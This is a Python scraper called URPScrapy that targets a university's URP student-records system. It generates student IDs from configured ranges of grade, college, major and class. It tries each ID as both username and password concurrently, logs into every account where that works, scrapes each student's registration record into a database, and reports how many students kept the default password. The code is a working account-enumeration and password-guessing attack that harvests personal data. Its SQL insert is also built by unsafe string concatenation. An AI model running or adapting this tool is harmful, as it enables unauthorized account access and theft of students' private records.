# -*- coding:utf-8 -*-
""" 
@author:James
Created on:18-2-8 14:25
"""

import gevent
import urllib3
from lxml import etree

from URPScrapy import db_init
from URPScrapy import settings


# 账号生成器
class InfoAccount(object):
	def __init__(self):
		# 所有生成的账号
		self.accounts = []
		# 年级
		grade = settings.URP_GRADE
		# 理工
		separator = settings.URP_SEPARATOR.strip()
		# 学部
		college = range(settings.URP_COLLEGE_START, settings.URP_COLLEGE_END + 1)
		# 专业
		major = range(settings.URP_MAJOR_START, settings.URP_MAJOR_END + 1)
		# 班级
		clazz = range(settings.URP_CLASS_START, settings.URP_CLASS_END + 1)
		# 学号
		stu = range(settings.URP_STU_START, settings.URP_STU_END + 1)

		# 生成学号
		for c in college:
			for m in major:
				for cl in clazz:
					for s in stu:
						stuid = str(grade).zfill(2) + separator + str(c).zfill(2) + str(m).zfill(2) + str(cl) + str(
							s).zfill(2)
						self.accounts.append(stuid)


# 账号校验器
class InfoValidate(object):
	def __init__(self):
		self.http = InfoMain.http
		# 有效账号
		self.account_valid = []
		# 可爬账号
		self.account_available = []

	def validate(self, all_account):
		jobs = [gevent.spawn(self.validate_account, self.http, a) for a in all_account]
		gevent.joinall(jobs, timeout=settings.SECOND_TIMEOUT)

	def validate_account(self, http, account):
		param = {"zjh": account, "mm": account}
		headers = {
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
			'Cache-Control': 'max-age=0',
			'Connection': 'close',
			'Host': settings.HOST,
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'
		}
		response = http.request('GET', settings.URL_LOGIN, fields=param, headers=headers)
		print('发送请求>>{}'.format(param))
		# fixme
		print(response.status)
		# fixme
		res_text = response.data.decode('GB2312', 'ignore')

		if res_text.__contains__('密码不正确'):
			# 密码有误
			self.account_valid.append(account)
		elif res_text.__contains__('你输入的证件号不存在，请您重新输入！'):
			# 证件号无效
			pass
		else:
			# 账号可爬
			self.account_available.append(account)
			print("账号可用>>>{}".format(account))


class InfoCollect(object):
	def __init__(self):
		self.http = InfoMain.http

	def get_info_queue(self, accounts):
		jobs = [gevent.spawn(self.get_info, a) for a in accounts]
		gevent.joinall(jobs, timeout=settings.SECOND_TIMEOUT)

	def get_info(self, stuid):
		# 先登录，获取 Cookie
		param = {'zjh': stuid, 'mm': stuid}
		response = self.http.request('GET', settings.URL_LOGIN, fields=param)
		set_cookie = response.headers['Set-Cookie']
		headers = {
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Encoding': 'gzip, deflate',
			'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
			'Cache-Control': 'max-age=0',
			'Connection': 'close',
			'Cookie': set_cookie,
			'Host': settings.HOST,
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0'
		}
		response_xjxx = self.http.request('GET', settings.HOST + settings.URL_XJXX, headers=headers)
		text = response_xjxx.data.decode('GB2312', 'ignore')

		selector = etree.HTML(text)
		text_arr = selector.xpath('//td[starts-with(@width,"275")]/text()')
		# 学籍信息
		result = []
		for info in text_arr:
			result.append(info.strip())
		self.save_info(result)
		# 登出
		self.http.request('POST', settings.HOST + settings.URL_LOGOUT, headers=headers)

	def save_info(self, info):
		db = InfoMain.db
		sql_str = 'INSERT INTO ' + settings.DB_TABLE_NAME + ' VALUES (NULL ,'
		for i in info:
			sql_str += "\'" + str(i) + "\'" + ','
		sql_str = sql_str[0:sql_str.__len__() - 1]
		sql_str += ")"
		print(sql_str)
		db.cursor().execute(sql_str)
		db.commit()


class InfoMain(object):
	db = db_init.connect_db()
	http = urllib3.HTTPConnectionPool(settings.HOST, 80)

	def autorun(self):
		account = InfoAccount()
		# 生成的所有账号
		all_account = account.accounts
		print(all_account)
		# 账号校验器
		validator = InfoValidate()
		validator.validate(all_account=all_account)
		print(validator.account_available)
		collector = InfoCollect()
		collector.get_info_queue(validator.account_available)
		# 计算
		num_sum = account.accounts.__len__()
		num_valid = validator.account_valid.__len__()
		num_available = validator.account_available.__len__()
		str_num_rate = "%.2f%%" % ((num_available / num_valid) * 100)
		print('总共尝试：{} 次，其中有效账号：{} 个，有效账号中用户名和密码一致的账号：{} 个，未修改密码的比例为：{}'.format(
			num_sum,
			num_valid,
			num_available,
			str_num_rate
		))


if __name__ == '__main__':
	app = InfoMain()
	app.autorun()
